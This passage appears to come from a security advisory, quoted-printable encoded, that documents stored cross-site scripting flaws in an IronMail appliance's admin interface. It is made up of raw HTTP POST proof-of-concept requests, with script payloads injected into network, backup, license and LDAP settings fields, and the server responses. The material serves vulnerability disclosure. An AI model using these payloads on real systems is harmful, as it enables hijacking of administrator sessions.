CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D17;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3F=\nmethod%3DsaveNew;\nmenusToExpand=3D%2CConfigurationMenu%2C;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nQmtu=3D1500&hostName=3Dmmail11&domainName=3Dsytes.net&ipAddress=3D%27%3E%=\n3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&ipNetMask=3D255.255.255.22=\n4&defaultRouter=3D10.1.1.2&dns1=3D10.1.1.3&dns2=3D10.1.1.4&dns3=3D10.1.1.=\n5&ntp1=3Dtime.nist.gov&ntp2=3Dbitsy.mit.edu&ntp3=3Dclock.isc.org&timeZone=\n=3DEurope%2FMadrid&ethernetSetting=3Dautoselect&submit=3DSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:12:31 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #5 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=3DsaveNew HT=\nTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer: https://172.0.0.2:10443/admin/system_IronMail.do?method=3DsaveNe=\nw\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 337\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D17;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3F=\nmethod%3DsaveNew;\nmenusToExpand=3D%2CConfigurationMenu%2C;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nQmtu=3D1500&hostName=3Dmmail11&domainName=3Dsytes.net&ipAddress=3D10.1.1.=\n1&ipNetMask=3D255.255.255.224&defaultRouter=3D%27%3E%3Cscript%3Ealert%28%=\n27SIA%27%29%3C%2Fscript%3E&dns1=3D10.1.1.3&dns2=3D10.1.1.4&dns3=3D10.1.1.=\n5&ntp1=3Dtime.nist.gov&ntp2=3Dbitsy.mit.edu&ntp3=3Dclock.isc.org&timeZone=\n=3DEurope%2FMadrid&ethernetSetting=3Dautoselect&submit=3DSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:12:36 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #6 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=3DsaveNew HT=\nTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer: https://172.0.0.2:10443/admin/system_IronMail.do?method=3DsaveNe=\nw\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 338\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D17;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3F=\nmethod%3DsaveNew;\nmenusToExpand=3D%2CConfigurationMenu%2C;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nRmtu=3D1500&hostName=3Dmmail11&domainName=3Dsytes.net&ipAddress=3D10.1.1.=\n1&ipNetMask=3D255.255.255.224&defaultRouter=3D10.1.1.2&dns1=3D%27%3E%3Csc=\nript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&dns2=3D10.1.1.4&dns3=3D10.1.1.=\n5&ntp1=3Dtime.nist.gov&ntp2=3Dbitsy.mit.edu&ntp3=3Dclock.isc.org&timeZone=\n=3DEurope%2FMadrid&ethernetSetting=3Dautoselect&submit=3DSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:12:41 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #7 ] :.\n\nPOST https://172.0.0.2:10443/admin/system_IronMail.do?method=3DsaveNew HT=\nTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer: https://172.0.0.2:10443/admin/system_IronMail.do?method=3DsaveNe=\nw\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 340\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D17;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/system_IronMail.do%3F=\nmethod%3DsaveNew;\nmenusToExpand=3D%2CConfigurationMenu%2C;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nTmtu=3D1500&hostName=3Dmmail11&domainName=3Dsytes.net&ipAddress=3D10.1.1.=\n1&ipNetMask=3D255.255.255.224&defaultRouter=3D10.1.1.2&dns1=3D10.1.1.3&dn=\ns2=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&dns3=3D10.1.1.=\n5&ntp1=3Dtime.nist.gov&ntp2=3Dbitsy.mit.edu&ntp3=3Dclock.isc.org&timeZone=\n=3DEurope%2FMadrid&ethernetSetting=3Dautoselect&submit=3DSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:12:48 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n\n=2E: [ XSS #8 ] :.\n\nPOST https://172.0.0.2:10443/admin/systemOutOfBand.do?method=3DsaveNew HT=\nTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/systemOutOfBand.do?method=3DgetDetail&isMen=\nuToggled=3D1\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 154\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D17;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/systemOutOfBand.do%3F=\nmethod%3DgetDetail%26isMenuToggled%3D1;\nmenusToExpand=3D%2CConfigurationMenu%2C;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\noutOfBand=3Dtrue&mtu=3D1500&ipAddress=3D%27%3E%3Cscript%3Ealert%28%27SIA%=\n27%29%3C%2Fscript%3E&ethernetSetting=3Dautoselect&ipNetMask=3D255.255.255=\n=2E224&submit=3DSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:13:16 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #9 ] :.\n\nPOST https://172.0.0.2:10443/admin/systemBackup.do?method=3Dsubmit HTTP/1=\n=2E1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/systemBackup.do?method=3Dinit&isMenuToggled=\n=3D1\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 146\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D17;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/systemBackup.do%3Fmet=\nhod%3Dinit%26isMenuToggled%3D1;\nmenusToExpand=3D%2CConfigurationMenu%2C;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\npassword=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&confirmP=\nassword=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&submit=3D=\nSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:13:41 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #10 ] :.\n\nPOST https://172.0.0.2:10443/admin/systemLicenseManager.do?method=3Dsubmi=\nt\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/systemLicenseManager.do?method=3Dinit&isMen=\nuToggled=3D1\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 75\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D17;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/systemLicenseManager.=\ndo%3Fmethod%3Dinit%26isMenuToggled%3D1;\nmenusToExpand=3D%2CConfigurationMenu%2C;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nKlicense=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&submit=3D=\nSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:20:28 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #11 ] :.\n\nPOST https://172.0.0.2:10443/admin/systemWebAdminConfig.do?method=3Dsave\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/systemWebAdminConfig.do?method=3Dinit&isMen=\nuToggled=3D1&procId=3D90\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 1225\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D15;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/systemWebAdminConfig.=\ndo%3Fmethod%3Dinit%26isMenuToggled%3D1%26procId%3D90;\nmenusToExpand=3D%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAc=\ncountMenu%2C;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=3D90&rows%5B0%5D.attrName=3Dgui_log_level&rows%5B0%5D.attrType=3D1=\n2&rows%5B0%5D.attrValidate=3D%5BLabelValueBean%5BCRITICAL%2C+1%5D%2C+Labe=\nlValueBean%5BERROR%2C+4%5D%2C+LabelValueBean%5BINFORMATION%2C+5%5D%2C+Lab=\nelValueBean%5BDETAILED%2C+6%5D%5D&rows%5B0%5D.attrValidateStr=3D30060003%=\n3A1%2C30060004%3A4%2C30060005%3A5%2C30060006%3A6&rows%5B0%5D.attrDepends=3D=\n&rows%5B0%5D.multipleValue=3D0&rows%5B0%5D.modifyable=3Dtrue&rows%5B0%5D.=\nattrValueStrClone=3D4&rows%5B0%5D.langTagId=3D2000003&rows%5B0%5D.attrVal=\nue=3D4&rows%5B1%5D.attrName=3Dgui_timeout&rows%5B1%5D.attrType=3D2&rows%5=\nB1%5D.attrValidate=3D%5B1-30%5D&rows%5B1%5D.attrValidateStr=3D%5B1-30%5D&=\nrows%5B1%5D.attrDepends=3D&rows%5B1%5D.multipleValue=3D0&rows%5B1%5D.modi=\nfyable=3Dtrue&rows%5B1%5D.attrValueStrClone=3D30&rows%5B1%5D.langTagId=3D=\n2001014&rows%5B1%5D.attrValueStr=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29=\n%3C%2Fscript%3E&rows%5B2%5D.attrName=3Dauto_refresh&rows%5B2%5D.attrType=3D=\n2&rows%5B2%5D.attrValidate=3D%5B1-30%5D&rows%5B2%5D.attrValidateStr=3D%5B=\n1-30%5D&rows%5B2%5D.attrDepends=3D&rows%5B2%5D.multipleValue=3D0&rows%5B2=\n%5D.modifyable=3Dtrue&rows%5B2%5D.attrValueStrClone=3D4&rows%5B2%5D.langT=\nagId=3D2001017&rows%5B2%5D.attrValueStr=3D%27%3E%3Cscript%3Ealert%28%27SI=\nA2%27%29%3C%2Fscript%3E&submitValue=3DSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:21:27 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #12 ] :.\n\nPOST\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=3D=\nsave\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=3D=\ninit&procId=3D164\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 2840\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D11;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/ldap_ConfigureService=\nProperties.do%3Fmethod%3Dinit%26procId%3D164;\nmenusToExpand=3D%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAc=\ncountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLD=\nAPConfigurationMenu%2C;\n/admin/dnsProtection.dofirsttimeload=3D1; /admin/dnsProtection.do=3D;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=3D164&rows%5B0%5D.attrName=3Dsync_time&rows%5B0%5D.attrType=3D2&ro=\nws%5B0%5D.attrValidate=3D%5B1-24%5D&rows%5B0%5D.attrValidateStr=3D%5B1-24=\n%5D&rows%5B0%5D.attrDepends=3D&rows%5B0%5D.multipleValue=3D0&rows%5B0%5D.=\nmodifyable=3Dtrue&rows%5B0%5D.attrValueStrClone=3D24&rows%5B0%5D.langTagI=\nd=3D2016401&rows%5B0%5D.attrValueStr=3D%27%3E%3Cscript%3Ealert%28%27SIA%2=\n7%29%3C%2Fscript%3E&rows%5B1%5D.attrName=3Dsync_results_count&rows%5B1%5D=\n=2EattrType=3D2&rows%5B1%5D.attrValidate=3D%5B1-500%5D&rows%5B1%5D.attrVa=\nlidateStr=3D%5B1-500%5D&rows%5B1%5D.attrDepends=3D&rows%5B1%5D.multipleVa=\nlue=3D0&rows%5B1%5D.modifyable=3Dtrue&rows%5B1%5D.attrValueStrClone=3D50&=\nrows%5B1%5D.langTagId=3D2016402&rows%5B1%5D.attrValueStr=3D50&rows%5B2%5D=\n=2EattrName=3Dsync_rules_order&rows%5B2%5D.attrType=3D1&rows%5B2%5D.attrV=\nalidate=3D&rows%5B2%5D.attrValidateStr=3D&rows%5B2%5D.attrDepends=3D&rows=\n%5B2%5D.multipleValue=3D1&rows%5B2%5D.modifyable=3Dtrue&rows%5B2%5D.attrV=\nalueStrClone=3D&rows%5B2%5D.langTagId=3D2016403&rows%5B2%5D.attrValue=3D&=\nrows%5B3%5D.attrName=3Dldap_fail_open&rows%5B3%5D.attrType=3D5&rows%5B3%5=\nD.attrValidate=3D&rows%5B3%5D.attrValidateStr=3D&rows%5B3%5D.attrDepends=3D=\n&rows%5B3%5D.multipleValue=3D0&rows%5B3%5D.modifyable=3Dtrue&rows%5B3%5D.=\nattrValueStrClone=3D1&rows%5B3%5D.langTagId=3D2016404&rows%5B3%5D.attrVal=\nue=3Dtrue&rows%5B4%5D.attrName=3Dldap_failure_count&rows%5B4%5D.attrType=3D=\n2&rows%5B4%5D.attrValidate=3D%5B1-50%5D&rows%5B4%5D.attrValidateStr=3D%5B=\n1-50%5D&rows%5B4%5D.attrDepends=3D&rows%5B4%5D.multipleValue=3D0&rows%5B4=\n%5D.modifyable=3Dtrue&rows%5B4%5D.attrValueStrClone=3D3&rows%5B4%5D.langT=\nagId=3D2016405&rows%5B4%5D.attrValueStr=3D3&rows%5B5%5D.attrName=3Dldap_m=\nonitor_intvl&rows%5B5%5D.attrType=3D2&rows%5B5%5D.attrValidate=3D%5B1-144=\n0%5D&rows%5B5%5D.attrValidateStr=3D%5B1-1440%5D&rows%5B5%5D.attrDepends=3D=\n&rows%5B5%5D.multipleValue=3D0&rows%5B5%5D.modifyable=3Dtrue&rows%5B5%5D.=\nattrValueStrClone=3D5&rows%5B5%5D.langTagId=3D2016406&rows%5B5%5D.attrVal=\nueStr=3D5&rows%5B6%5D.attrName=3Dldap_alert_type&rows%5B6%5D.attrType=3D1=\n2&rows%5B6%5D.attrValidate=3D%5BLabelValueBean%5BNo+Alert%2C+0%5D%2C+Labe=\nlValueBean%5BRESTART%2C+1%5D%2C+LabelValueBean%5BSHUTDOWN%2C+2%5D%2C+Labe=\nlValueBean%5BCRITICAL%2C+3%5D%2C+LabelValueBean%5BERROR%2C+4%5D%2C+LabelV=\nalueBean%5BWARNING%2C+5%5D%2C+LabelValueBean%5BNOTIFICATION%2C+6%5D%2C+La=\nbelValueBean%5BINFORMATION%2C+7%5D%5D&rows%5B6%5D.attrValidateStr=3D30060=\n019%3A0%2C30060007%3A1%2C30060008%3A2%2C30060003%3A3%2C30060004%3A4%2C300=\n60009%3A5%2C30060010%3A6%2C30060005%3A7&rows%5B6%5D.attrDepends=3D&rows%5=\nB6%5D.multipleValue=3D0&rows%5B6%5D.modifyable=3Dtrue&rows%5B6%5D.attrVal=\nueStrClone=3D3&rows%5B6%5D.langTagId=3D2016407&rows%5B6%5D.attrValue=3D3&=\nrows%5B7%5D.attrName=3Dldap_route_aft_masq&rows%5B7%5D.attrType=3D5&rows%=\n5B7%5D.attrValidate=3D&rows%5B7%5D.attrValidateStr=3D&rows%5B7%5D.attrDep=\nends=3D&rows%5B7%5D.multipleValue=3D0&rows%5B7%5D.modifyable=3Dtrue&rows%=\n5B7%5D.attrValueStrClone=3D0&rows%5B7%5D.langTagId=3D2016408&submitValue=3D=\nSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:22:51 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #13 ] :.\n\nPOST\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=3D=\nsave\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=3D=\nsave\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 2840\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D11;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/ldap_ConfigureService=\nProperties.do%3Fmethod%3Dinit%26procId%3D164;\nmenusToExpand=3D%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAc=\ncountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLD=\nAPConfigurationMenu%2C;\n/admin/dnsProtection.dofirsttimeload=3D1; /admin/dnsProtection.do=3D;\nJSESSIONID=3D5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=3D164&rows%5B0%5D.attrName=3Dsync_time&rows%5B0%5D.attrType=3D2&ro=\nws%5B0%5D.attrValidate=3D%5B1-24%5D&rows%5B0%5D.attrValidateStr=3D%5B1-24=\n%5D&rows%5B0%5D.attrDepends=3D&rows%5B0%5D.multipleValue=3D0&rows%5B0%5D.=\nmodifyable=3Dtrue&rows%5B0%5D.attrValueStrClone=3D24&rows%5B0%5D.langTagI=\nd=3D2016401&rows%5B0%5D.attrValueStr=3D24&rows%5B1%5D.attrName=3Dsync_res=\nults_count&rows%5B1%5D.attrType=3D2&rows%5B1%5D.attrValidate=3D%5B1-500%5=\nD&rows%5B1%5D.attrValidateStr=3D%5B1-500%5D&rows%5B1%5D.attrDepends=3D&ro=\nws%5B1%5D.multipleValue=3D0&rows%5B1%5D.modifyable=3Dtrue&rows%5B1%5D.att=\nrValueStrClone=3D50&rows%5B1%5D.langTagId=3D2016402&rows%5B1%5D.attrValue=\nStr=3D%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&rows%5B2%5D.a=\nttrName=3Dsync_rules_order&rows%5B2%5D.attrType=3D1&rows%5B2%5D.attrValid=\nate=3D&rows%5B2%5D.attrValidateStr=3D&rows%5B2%5D.attrDepends=3D&rows%5B2=\n%5D.multipleValue=3D1&rows%5B2%5D.modifyable=3Dtrue&rows%5B2%5D.attrValue=\nStrClone=3D&rows%5B2%5D.langTagId=3D2016403&rows%5B2%5D.attrValue=3D&rows=\n%5B3%5D.attrName=3Dldap_fail_open&rows%5B3%5D.attrType=3D5&rows%5B3%5D.at=\ntrValidate=3D&rows%5B3%5D.attrValidateStr=3D&rows%5B3%5D.attrDepends=3D&r=\nows%5B3%5D.multipleValue=3D0&rows%5B3%5D.modifyable=3Dtrue&rows%5B3%5D.at=\ntrValueStrClone=3D1&rows%5B3%5D.langTagId=3D2016404&rows%5B3%5D.attrValue=\n=3Dtrue&rows%5B4%5D.attrName=3Dldap_failure_count&rows%5B4%5D.attrType=3D=\n2&rows%5B4%5D.attrValidate=3D%5B1-50%5D&rows%5B4%5D.attrValidateStr=3D%5B=\n1-50%5D&rows%5B4%5D.attrDepends=3D&rows%5B4%5D.multipleValue=3D0&rows%5B4=\n%5D.modifyable=3Dtrue&rows%5B4%5D.attrValueStrClone=3D3&rows%5B4%5D.langT=\nagId=3D2016405&rows%5B4%5D.attrValueStr=3D3&rows%5B5%5D.attrName=3Dldap_m=\nonitor_intvl&rows%5B5%5D.attrType=3D2&rows%5B5%5D.attrValidate=3D%5B1-144=\n0%5D&rows%5B5%5D.attrValidateStr=3D%5B1-1440%5D&rows%5B5%5D.attrDepends=3D=\n&rows%5B5%5D.multipleValue=3D0&rows%5B5%5D.modifyable=3Dtrue&rows%5B5%5D.=\nattrValueStrClone=3D5&rows%5B5%5D.langTagId=3D2016406&rows%5B5%5D.attrVal=\nueStr=3D5&rows%5B6%5D.attrName=3Dldap_alert_type&rows%5B6%5D.attrType=3D1=\n2&rows%5B6%5D.attrValidate=3D%5BLabelValueBean%5BNo+Alert%2C+0%5D%2C+Labe=\nlValueBean%5BRESTART%2C+1%5D%2C+LabelValueBean%5BSHUTDOWN%2C+2%5D%2C+Labe=\nlValueBean%5BCRITICAL%2C+3%5D%2C+LabelValueBean%5BERROR%2C+4%5D%2C+LabelV=\nalueBean%5BWARNING%2C+5%5D%2C+LabelValueBean%5BNOTIFICATION%2C+6%5D%2C+La=\nbelValueBean%5BINFORMATION%2C+7%5D%5D&rows%5B6%5D.attrValidateStr=3D30060=\n019%3A0%2C30060007%3A1%2C30060008%3A2%2C30060003%3A3%2C30060004%3A4%2C300=\n60009%3A5%2C30060010%3A6%2C30060005%3A7&rows%5B6%5D.attrDepends=3D&rows%5=\nB6%5D.multipleValue=3D0&rows%5B6%5D.modifyable=3Dtrue&rows%5B6%5D.attrVal=\nueStrClone=3D3&rows%5B6%5D.langTagId=3D2016407&rows%5B6%5D.attrValue=3D3&=\nrows%5B7%5D.attrName=3Dldap_route_aft_masq&rows%5B7%5D.attrType=3D5&rows%=\n5B7%5D.attrValidate=3D&rows%5B7%5D.attrValidateStr=3D&rows%5B7%5D.attrDep=\nends=3D&rows%5B7%5D.multipleValue=3D0&rows%5B7%5D.modifyable=3Dtrue&rows%=\n5B7%5D.attrValueStrClone=3D0&rows%5B7%5D.langTagId=3D2016408&submitValue=3D=\nSubmit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:22:56 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=3Dutf-8\n\n=2E: [ XSS #14 ] :.\n\nPOST\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=3D=\nsave\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/ldap_ConfigureServiceProperties.do?method=3D=\nsave\nAccept-Language: es-ES,en-us;q=3D0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 2842\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=3D2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=3D11;\nitemToHighlight=3Dhttps%3A//172.0.0.2%3A10443/admin/ldap_ConfigureService=\nProperties.do%3Fmethod%3Dinit%26procId%3D164;\nmenusToExpand=3D%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAc=\ncountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLD=\nAPConfigurationMenu%2C;\n/admin/dnsProtection.dofirsttimeload=3D1; 